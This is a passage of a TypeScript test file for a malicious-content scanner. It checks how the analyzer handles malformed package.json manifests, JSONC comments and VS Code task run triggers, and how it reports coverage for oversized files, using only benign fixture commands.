    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-002');
    expect(result.findings[0]?.metadata?.trace).toEqual(['package.json']);
  });

  it('marks malformed entrypoint manifests as incomplete', () => {
    const result = analyzeMaliciousContent([
      { path: 'package.json', content: '{"scripts":' },
      { path: 'README.md', content: 'safe text' }
    ]);
    expect(result.coverage.state).toBe('partial');
    expect(result.coverage.skipped).toBe(1);
  });

  it('keeps comment-like URL text intact and fails closed on unterminated JSONC comments', () => {
    const benign = analyzeMaliciousContent([
      {
        path: '.vscode/tasks.json',
        content: [
          '{',
          '  // Allowed comment.',
          '  "tasks": [{ "label": "https://example.invalid/a/*literal*/", "command": "echo ok", },],',
          '}'
        ].join('\n')
      }
    ]);
    expect(benign.coverage.state).toBe('complete');
    expect(benign.findings).toHaveLength(0);

    const malformed = analyzeMaliciousContent([
      {
        path: '.vscode/tasks.json',
        content: '{"tasks":[{"command":"node init"}], /* unfinished'
      }
    ]);
    expect(malformed.coverage.state).not.toBe('complete');
  });

  it('marks structurally malformed editor tasks as incomplete', () => {
    const result = analyzeMaliciousContent([
      {
        path: '.vscode/tasks.json',
        content: JSON.stringify({ tasks: { runOn: 'folderOpen' } })
      }
    ]);
    expect(result.coverage.state).toBe('failed');
    expect(result.coverage.skipped).toBe(1);

    const unsupportedRunTrigger = analyzeMaliciousContent([
      {
        path: '.vscode/tasks.json',
        content: JSON.stringify({
          tasks: [{ runOptions: { runOn: 'startup' }, command: 'node init' }]
        })
      }
    ]);
    expect(unsupportedRunTrigger.coverage.state).toBe('failed');
  });

  it('marks input beyond the per-file analysis budget incomplete', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'oversized.txt',
        content: 'x'.repeat(2 * 1024 * 1024 + 1)
      }
    ]);
    expect(result.coverage.state).toBe('failed');
    expect(result.coverage.scanned).toBe(0);
    expect(result.coverage.skipped).toBe(1);
  });
});
